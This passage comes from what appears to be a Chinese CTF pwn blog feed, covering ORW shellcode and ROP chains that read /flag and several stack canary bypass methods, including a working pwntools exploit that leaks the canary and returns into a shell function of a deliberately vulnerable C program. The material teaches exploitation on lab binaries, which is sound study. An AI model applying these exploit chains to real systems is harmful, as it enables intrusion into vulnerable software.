operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># 打开本地的flag文件</span>ORW <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 文件描述符3：其它打开的文件，将 flag 内容写入到 data_address 地址处</span>ORW <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> data_address<span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 文件描述符1：输出到屏幕，打印地址 data_address 处存储的 flag 内容</span>ORW <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> data_address<span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="ROP-型"><a href="#ROP-型" class="headerlink" title="ROP 型"></a>ROP 型</h2><blockquote><p>如果程序开启了 NX 保护，那么 Shellcode 型 ORW 就失效了</p><p>因此，<strong>相对来说，这种 ROP 的方式实用性更广一些</strong></p></blockquote><h3 id="32-位-ORW-构造-1"><a href="#32-位-ORW-构造-1" class="headerlink" title="32 位 ORW 构造"></a>32 位 ORW 构造</h3><blockquote><p>注意：32 位程序在传参时栈上会多出一个返回地址 <code>back_addr</code></p><p><em>我们可以将 <code>back_addr</code> 设置为让我们输入构造 ROP 的地方，这样就可以连续输入 3 次，将 ORW 连续 3 次分别写入并执行</em></p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># fd = fopen('/flag', 'r') </span>ORW1 <span class="token operator">=</span> p32<span class="token punctuation">(</span>fopen_plt_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>back_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>r_addr<span class="token punctuation">)</span><span class="token comment"># read(3, write_flag_addr, 0x50)</span>ORW2 <span class="token operator">=</span> p32<span class="token punctuation">(</span>read_plt_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>back_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token comment"># write(1, write_flag_addr, 0x50)</span>ORW3 <span class="token operator">=</span> p32<span class="token punctuation">(</span>write_plt_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="64-位-ORW-构造-1"><a href="#64-位-ORW-构造-1" class="headerlink" title="64 位 ORW 构造"></a>64 位 ORW 构造</h3><blockquote><p>注意：64 位程序传参需要借助寄存器</p><p><em>因此程序中具体存在什么样的 gadget 需要具体分析，ORW 构造也会相应地修改，但只要保证我们能够将对应的值传入对应的寄存器中即可</em></p><p><strong>如果没有合适的 gadget 利用，可以尝试 Ret2csu</strong></p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># open(b'/flag\x00\x00', 0)</span>ORW <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>open64_plt_addr<span class="token punctuation">)</span><span class="token comment"># read(3, name_addr, 0x50)</span>ORW <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_rbx_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_plt_addr<span class="token punctuation">)</span><span class="token comment"># write(1, name_addr, 0x50)</span>ORW <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_rbx_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>write_plt_addr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> ORW </tag>
            
            <tag> 沙箱绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bypass安全机制</title>
      <link href="/posts/c695aa69.html"/>
      <url>/posts/c695aa69.html</url>
      
        <content type="html"><![CDATA[<h1 id="Canary-Bypass"><a href="#Canary-Bypass" class="headerlink" title="Canary Bypass"></a>Canary Bypass</h1><blockquote><p>本节主要汇总了常用的绕过 Canary 的方法</p><p>参考文章：<a href="https://www.anquanke.com/post/id/262846#h2-16">绕过canary保护的6种方法-安全客 - 安全资讯平台</a></p></blockquote><hr><h2 id="什么是-Canary？"><a href="#什么是-Canary？" class="headerlink" title="什么是 Canary？"></a>什么是 Canary？</h2><blockquote><p>Canary 又叫金丝雀，是一种针对栈溢出的保护机制，它在程序的函数入口处从 GS 段（32 位）或 FS 段（64 位）内获取一个随机值，<strong>每次进程重启的 Canary 都不同，但是同一个进程中的不同线程的 Canary 是相同的</strong></p><p>如果我们想利用栈溢出覆盖返回值，则填充的数据必定会经过栈上的 Canary，如果程序检测到 Canary 的值被修改，程序便会执行 <code>__stack_chk_fail</code> 函数，导致程序发生崩溃，我们也就无法利用栈溢出漏洞了</p><p>触发 Canary 保护时，程序会输出：<code>*** stack smashing detected ***: terminated</code></p><p>注意：<mark>子进程由于触发 Canary 崩溃不会导致父进程退出</mark>，这为我们 Bypass Canary 提供了更多的可能</p></blockquote><p>GCC 编译时设置 Canary 保护的参数：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">-fstack-protector   <span class="token comment"># 启用保护，不过只为局部变量中含有 char 数组的函数插入保护</span>-fstack-protector-all   <span class="token comment"># 启用保护，为所有函数插入保护</span>-fstack-protector-strong-fstack-protector-explicit   <span class="token comment"># 只对有明确 stack_protect attribute 的函数开启保护</span>-fno-stack-protector   <span class="token comment"># 禁用保护</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 IDA 中，Canary 一般以如下形式出现：</p><ul><li>64 位程序</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c">v2 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B613.png" alt="CTF-PWN_Bypass安全机制13.png"></p><ul><li>32 位程序</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c">v2 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B614.png" alt="CTF-PWN_Bypass安全机制14.png"></p><p>在 64 位程序中，通常 Canary 在栈中是位于 RBP 上方的 8 字节（与 RBP 相邻），<strong>但是 Canary 的位置不一定总是与 RBP 相邻，具体得看编译器的操作</strong></p><p>以一个 64 位程序的例子来说明：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B61.png" alt="CTF-PWN_Bypass安全机制1.png"></p><p>可以看到 <code>v2</code> 位于 <code>rbp - 8h</code> 的地方，正好在 RBP 上方的 8 字节（与 RBP 相邻）</p><p>在栈中的样子：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B62.png" alt="CTF-PWN_Bypass安全机制2.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B65.png" alt="CTF-PWN_Bypass安全机制5.png"></p><p>但 Canary 的位置也不是绝对的，需要具体情况具体分析</p><p>例如下面这个 32 位程序的例子：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B63.png" alt="CTF-PWN_Bypass安全机制3.png"></p><p>可以看到 <code>v7</code> 位于 <code>ebp - Ch</code> 的地方，而不是 EBP 上方的 4 字节（与 EBP 不相邻）</p><p>在栈中的样子：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B64.png" alt="CTF-PWN_Bypass安全机制4.png"></p><p>这里的 Canary 在栈中位于 EBP 上方的第 <code>(0xC - 0x0) / 4 = 3</code> 个位置</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B66.png" alt="CTF-PWN_Bypass安全机制6.png"></p><blockquote><p>Canary 一般有如下特点：</p><ol><li>十六进制通常以 <code>&#39;\x00&#39;</code> 结尾，例如：<code>0x29a30f00</code>，在内存中其实是 <code>0x00 0x0f 0xa3 0x29</code>，这样是为了与 Canary 前面的内容截断。也就是说在不溢出的情况下，我们无法通过 <code>printf()</code> 之类的函数将 Canary 打印出来，因为这些函数在遇到 Canary 第一字节的 <code>0x00</code> 就被截断了  </li><li>每次进程重启的 Canary 都不同，但是同一个进程中的不同线程的 Canary 是相同的，<em>也就意味着，在同一次程序的运行中，所有的 Canary 的值都是相同的</em></li></ol></blockquote><hr><h2 id="格式化字符串泄露-Canary"><a href="#格式化字符串泄露-Canary" class="headerlink" title="格式化字符串泄露 Canary"></a>格式化字符串泄露 Canary</h2><blockquote><p>如果存在格式化字符串漏洞，那么 Canary 保护基本等同于虚设，因为我们可以直接泄露出 Canary</p></blockquote><p>这种 Bypass 方法重点在于确定 Canary 在栈中的位置，泄露比较简单，因此不做过多解释</p><p>具体如何泄露，可以查看本站《<a href="%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A8.md">格式化字符串漏洞与利用</a>》这篇文章</p><hr><h2 id="覆盖低字节输出-Canary"><a href="#覆盖低字节输出-Canary" class="headerlink" title="覆盖低字节输出 Canary"></a>覆盖低字节输出 Canary</h2><blockquote><p>前面提到 Canary 的十六进制数值通常以 <code>&#39;\x00&#39;</code> 结尾，而在内存中是小端序储存，例如：<code>0x29a30f00</code>，在内存中其实是 <code>0x00 0x0f 0xa3 0x29</code>，这样是为了让 <code>&#39;\x00&#39;</code> 截断 Canary 前面的数据，防止将 Canary 打印出来</p><p>那么同样的思路，<strong>如果我们能够覆盖 Canary 低字节的 <code>&#39;\x00&#39;</code>，就可以直接将 Canary 输出了</strong></p></blockquote><p>以一个例子说明：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">getshell</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">init_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">vuln_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">init_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Weclome to uf4te!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">vuln_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// gcc -m32 -no-pie -g -o test test.c</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译后保护机制如下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B67.png" alt="CTF-PWN_Bypass安全机制7.png"></p><p>调试我们发现，Canary 在栈中的 EBP 上方第三个位置，Canary 下方相邻处有一条即将被 <code>puts(&quot;Weclome to uf4te!&quot;);</code> 输出的内容</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B68.png" alt="CTF-PWN_Bypass安全机制8.png"></p><p>计算一下我们输入的位置与他们的偏移，可以看到输入的起始地址在 <code>0xffffcd68</code> 处</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B69.png" alt="CTF-PWN_Bypass安全机制9.png"></p><p>与 Canary 距离 100 字节：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B610.png" alt="CTF-PWN_Bypass安全机制10.png"></p><p>因此第一次 <code>read(0, buf, 0x200);</code> 我们发送的 payload 为：<code>payload = b&#39;a&#39; * 100</code>，这样就刚好覆盖到 Canary 的上一个数据，然后我们用 <code>io.sendline(payload)</code> 来发送 payload</p><p>因为 <code>io.sendline()</code> 会在 payload 的结尾添加一个回车符，即：<code>&#39;0x0a&#39;</code>，相当于我们总共发送了 101 个字节，前 100 个字节到达 Canary 的位置，最后一个 <code>&#39;0x0a&#39;</code> 覆盖 Canary 的最低一字节</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B611.png" alt="CTF-PWN_Bypass安全机制11.png"></p><p>可以看到此时 Canary 的最低一字节不再是 <code>&#39;\x00&#39;</code> 而是 <code>&#39;\x0a&#39;</code></p><p>然后继续执行到 <code>printf(buf);</code> 的地方</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B612.png" alt="CTF-PWN_Bypass安全机制12.png"></p><p>可以看到除了我们输入的 <code>&#39;a&#39;</code> 和 <code>&#39;\x0a&#39;</code> 外，程序还输出了一些别的数据，<code>&#39;\x0a&#39;</code> 以及其后的 3 字节：<code>0x0a 0x91 0x67 0x54</code> 就是修改后的 Canary 的值了</p><p>我们用泄露出的地址减去 <code>0x0a</code> 就是真正的 Canary 的值</p><p>由于在同一次运行中，Canary 的值是不会变的，因此第二次 <code>read(0, buf, 0x200);</code> 我们在覆盖时要用泄露出的 Canary 替换，保证不覆盖 Canary 的值</p><p>因此 exp 如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># 设置系统架构, 打印调试信息</span><span class="token comment"># arch 可选 : i386 / amd64 / arm / mips</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN 远程 : content = 0, PWN 本地 : content = 1</span>content <span class="token operator">=</span> <span class="token number">1</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./test"</span><span class="token punctuation">)</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token comment"># 将本地的 Linux 程序启动为进程 io</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./test"</span><span class="token punctuation">)</span><span class="token comment"># 附加 gdb 调试</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>   <span class="token comment"># 只有本地才可调试，远程无法调试</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>        pause<span class="token punctuation">(</span><span class="token punctuation">)</span>getshell_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"getshell"</span><span class="token punctuation">]</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">100</span><span class="token comment"># debug()</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">100</span><span class="token punctuation">)</span>Canary <span class="token operator">=</span> u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0xa</span>   <span class="token comment"># 为了泄露出 Canary，其最低位被我们修改为 '\x0a'，因此减去 0xa 后才是真正的 Canary 的值</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Canary -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>Canary<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">100</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>Canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">12</span>   <span class="token comment"># 填充 Canary 后距离返回地址还差 12 字节，因此再填充 b'a' * 12</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>getshell_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment"># 与远程交互</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="one-by-one-逐字节爆破-Canary"><a href="#one-by-one-逐字节爆破-Canary" class="headerlink" title="one-by-one 逐字节爆破 Canary"></a>one-by-one 逐字节爆破 Canary</h2><blockquote><p>虽然每次进程重启的 Canary 都不同，但是同一个进程中的不同线程的 Canary 是相同的，并且<strong>通过 fork 函数创建的子进程的 Canary 也是相同的</strong>，同时 <em>Canary 的最低一字节为 <code>&#39;\x00&#39;</code> 是不会变的</em>，因此，我们可以考虑对 Canary 进行爆破</p></blockquote><p>以 64 位程序为例，64 位程序的 Canary 一般为 8 字节，同时最低一字节为 <code>&#39;\x00&#39;</code></p><p>因此相当于需要爆破高位的 7 字节，每一字节的取值范围在 <code>0 ~ 255</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-funcanary2.png" alt="CISCN2023-funcanary2.png"></p><p>例如上图中，通过 <code>fork()</code> 函数产生的 canary 金丝雀的值是固定不变的</p><blockquote><p>注意：</p><p>一般情况下，我们爆破 Canary 的过程中如果出现错误，就会导致程序崩溃，因此通常是不可行的</p><p>但是这里是通过 <code>fork()</code> 函数生成了子线程，<strong>子进程崩溃不会导致父进程退出</strong>，因此可以爆破</p></blockquote><p>具体例题见本站的《<a href="%E3%80%90CISCN%202023%E3%80%91funcanary.md">【CISCN 2023】funcanary</a>》</p><hr><h2 id="SSP-Leak-绕过-Canary"><a href="#SSP-Leak-绕过-Canary" class="headerlink" title="SSP Leak 绕过 Canary"></a>SSP Leak 绕过 Canary</h2><blockquote><p>全称是 Stack Smashing Protect Leak，其实就是利用了我们前面提到的触发 Canary 后会输出：<code>*** stack smashing detected ***: terminated</code>，通过故意触发 Canary 保护并修改要输出的变量 <code>__libc_argv[0]</code> 的地址来实现任意地址读取</p><p><em>这个问题依赖于 Glibc 的版本，在 Ubuntu 22.04 的 Glibc 2.35 中已经修复，如果想在本地复现就需要更换 Glibc 版本，Glibc 2.26 以后所有修改，目前已知 Glibc 2.25 及以下版本都未修复该漏洞</em> </p><p><mark>注意：SSP Leak 只能泄露内存中的数据，但无法获得 shell</mark></p></blockquote><p>首先分析一下触发 Canary 后执行的 <code>__stack_chk_fail</code> 函数</p><p>由于这个函数是 Glibc 中的，想查看需要下载 Glibc 源码，下载地址：<a href="https://ftp.gnu.org/gnu/glibc/">Index of &#x2F;gnu&#x2F;glibc</a></p><p>先来看看旧的版本 Glibc 2.19 中的实现</p><p>在 <code>./debug/stack_chk_fail.c</code> 下找到 <code>__stack_chk_fail</code> 函数的源码：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// ./glibc-2.19/debug/stack_chk_fail.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">extern</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>__libc_argv attribute_hidden<span class="token punctuation">;</span><span class="token keyword">void</span><span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>noreturn<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">__stack_chk_fail</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">__fortify_fail</span> <span class="token punctuation">(</span><span class="token string">"stack smashing detected"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 <code>./debug/fortify_fail.c</code> 下找到 <code>__fortify_fail</code> 函数的源码：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// ./glibc-2.19/debug/fortify_fail.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">extern</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>__libc_argv attribute_hidden<span class="token punctuation">;</span><span class="token keyword">void</span><span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>noreturn<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">__fortify_fail</span> <span class="token punctuation">(</span>msg<span class="token punctuation">)</span>     <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>msg<span class="token punctuation">;</span><span class="token punctuation">&#123;</span>  <span class="token comment">/* The loop is added only to keep gcc happy.  */</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token function">__libc_message</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"*** %s ***: %s terminated\n"</span><span class="token punctuation">,</span>    msg<span class="token punctuation">,</span> __libc_argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">:</span> <span class="token string">"&lt;unknown>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">libc_hidden_def</span> <span class="token punctuation">(</span>__fortify_fail<span class="token punctuation">)</span><span aria-hidden="true" 